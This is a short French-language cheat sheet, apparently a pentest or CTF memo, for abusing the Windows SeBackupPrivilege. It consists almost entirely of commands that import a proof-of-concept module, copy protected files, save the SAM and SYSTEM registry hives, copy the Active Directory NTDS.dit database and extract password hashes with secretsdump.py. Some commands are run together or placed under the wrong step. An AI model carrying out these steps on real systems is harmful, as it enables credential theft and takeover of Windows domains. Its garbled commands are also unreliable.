[https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
### Importation des DLL du PoC

- **Commandes PowerShell :** `Import-Module .\SeBackupPrivilegeUtils.dll  
    ``Import-Module .\SeBackupPrivilegeCmdLets.dll  
    
- **Description :** Importe les modules nécessaires pour exploiter le privilège de sauvegarde de sécurité (SeBackupPrivilege).

### Vérification du Statut du Privilège

- **Commande PowerShell :** `Get-SeBackupPrivilege`
- **Description :** Affiche si le privilège de sauvegarde est activé ou désactivé pour l'utilisateur actuel.

### Activation du Privilège

- **Commande PowerShell :** `Set-SeBackupPrivilege`
- **Description :** Active le privilège de sauvegarde pour l'utilisateur actuel.

### Copie de Fichiers Protégés

- **Commande PowerShell :** `Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt`  
    
- **Description :** Utilise le privilège de sauvegarde pour copier un fichier normalement protégé par des droits d'accès restreints.

### Extraction des Informations de SAM et SYSTEM

Sauvegarde des Clefs de Registre SYSTEM et SAM

- **Commandes PowerShell :** `reg save HKLM\SAM SAM.SAV reg save HKLM\SYSTEM SYSTEM.SAV`  
    
- **Description :** Crée une sauvegarde des ruches de registre SAM et SYSTEM, contenant des informations sur les comptes locaux et les configurations système.

### Extraction des Informations

- **Commande Bash :** `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`  
    
- **Description :** Utilise `secretsdump.py` pour extraire des informations, telles que des hashes de mots de passe, à partir des fichiers sauvegardés.

### Accès à la Base de Données Active Directory

Copie de NTDS.dit

- **Commandes PowerShell :** `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit` ou `robocopy /B E:\Windows\NTDS .\ntds ntds.dit`  
    
- **Description :** Copie la base de données NTDS.dit, qui contient les informations des utilisateurs et mots de passe de l'Active Directory, en utilisant le privilège de sauvegarde.